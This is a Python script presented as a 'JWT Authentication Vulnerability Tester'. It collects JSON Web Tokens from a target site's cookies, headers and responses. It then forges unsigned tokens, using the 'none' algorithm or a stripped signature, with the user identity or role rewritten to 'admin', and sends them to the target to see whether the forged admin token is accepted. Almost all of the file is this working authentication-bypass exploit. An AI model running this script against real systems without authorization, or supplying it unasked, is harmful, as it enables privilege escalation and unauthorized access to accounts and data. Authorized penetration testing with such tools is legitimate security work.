import requests
import argparse
import sys
import base64
import json
import hmac
import hashlib
from urllib.parse import urljoin

def parse_args():
    parser = argparse.ArgumentParser(description="JWT Authentication Vulnerability Tester")
    parser.add_argument("url", help="Target URL to test for JWT vulnerabilities")
    parser.add_argument("--endpoint", help="Specific API endpoint to test (optional)", default="")
    parser.add_argument("--output", nargs="+", help="Output format (json) followed by optional filename (e.g., json output.json)")
    return parser.parse_args()

def decode_jwt_part(part):
    try:
        # Add padding if needed
        part += '=' * (-len(part) % 4)
        decoded = base64.urlsafe_b64decode(part).decode('utf-8')
        return json.loads(decoded)
    except (base64.binascii.Error, json.JSONDecodeError, UnicodeDecodeError):
        return None

def find_jwts(url):
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        jwts = []

        # Check cookies
        for cookie in response.cookies:
            if '.' in cookie.value:  # Basic JWT check
                parts = cookie.value.split('.')
                if len(parts) == 3:
                    jwts.append({'source': f'Cookie: {cookie.name}', 'token': cookie.value})

        # Check Authorization header
        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            token = auth_header[7:]
            if '.' in token:
                jwts.append({'source': 'Authorization Header', 'token': token})

        # Check JSON response
        try:
            json_data = response.json()
            for key, value in json_data.items():
                if isinstance(value, str) and '.' in value:
                    parts = value.split('.')
                    if len(parts) == 3:
                        jwts.append({'source': f'JSON: {key}', 'token': value})
        except ValueError:
            pass

        return jwts
    except requests.RequestException:
        return []

def analyze_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return {'valid': False, 'error': 'Invalid JWT format'}

    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    signature = parts[2]

    if not header or not payload:
        return {'valid': False, 'error': 'Failed to decode header or payload'}

    vulnerabilities = []
    if header.get('alg') == 'none':
        vulnerabilities.append("Vulnerable: 'none' algorithm detected (no signature required)")
    if header.get('alg') == 'HS256':
        vulnerabilities.append("Potential weakness: HS256 used (test for weak secrets)")

    return {
        'valid': True,
        'header': header,
        'payload': payload,
        'vulnerabilities': vulnerabilities
    }

def forge_and_test_jwt(url, endpoint, original_token):
    parts = original_token.split('.')
    if len(parts) != 3:
        return {'success': False, 'error': 'Invalid JWT for forging'}

    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])

    if not header or not payload:
        return {'success': False, 'error': 'Failed to decode JWT for forging'}

    # Modify payload (e.g., change user_id to admin)
    new_payload = payload.copy()
    if 'user_id' in new_payload:
        new_payload['user_id'] = 'admin'
    elif 'sub' in new_payload:
        new_payload['sub'] = 'admin'
    else:
        new_payload['role'] = 'admin'

    # Encode new header and payload
    new_header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
    
    # Test with 'none' algorithm
    none_header = {'alg': 'none', 'typ': 'JWT'}
    none_header_b64 = base64.urlsafe_b64encode(json.dumps(none_header).encode()).decode().rstrip('=')
    none_token = f"{none_header_b64}.{new_payload_b64}."

    # Test with original algorithm (no signature for simplicity)
    forged_token = f"{new_header_b64}.{new_payload_b64}."

    results = []
    for test_token, algo in [(none_token, 'none'), (forged_token, header.get('alg'))]:
        try:
            headers = {'Authorization': f'Bearer {test_token}'}
            test_url = urljoin(url, endpoint) if endpoint else url
            response = requests.get(test_url, headers=headers, timeout=5)
            if response.status_code == 200:
                results.append(f"Success: Forged token with {algo} accepted! Response: {response.text[:100]}")
            else:
                results.append(f"Failed: Forged token with {algo} rejected (Status: {response.status_code})")
        except requests.RequestException:
            results.append(f"Error testing forged token with {algo}")

    return {'success': bool(results), 'results': results}

def main():
    args = parse_args()
    url = args.url
    endpoint = args.endpoint
    print(f"Testing {url} for JWT vulnerabilities...")

    # Find JWTs
    jwts = find_jwts(url)
    if not jwts:
        return

    # Analyze and test each JWT
    results = {"url": url, "endpoint": endpoint, "jwts": []}
    for jwt in jwts:
        analysis = analyze_jwt(jwt['token'])
        if not analysis['valid']:
            continue

        forge_results = forge_and_test_jwt(url, endpoint, jwt['token'])
        results["jwts"].append({
            'source': jwt['source'],
            'token': jwt['token'][:50] + "..." if len(jwt['token']) > 50 else jwt['token'],
            'analysis': analysis,
            'forge_results': forge_results
        })
    
    # Handle output
    if args.output and args.output[0] == "json":
        output_data = json.dumps(results, indent=2)
        if len(args.output) > 1:
            with open(args.output[1], "w") as f:
                f.write(output_data)
        else:
            print(output_data)

if __name__ == "__main__":
    main()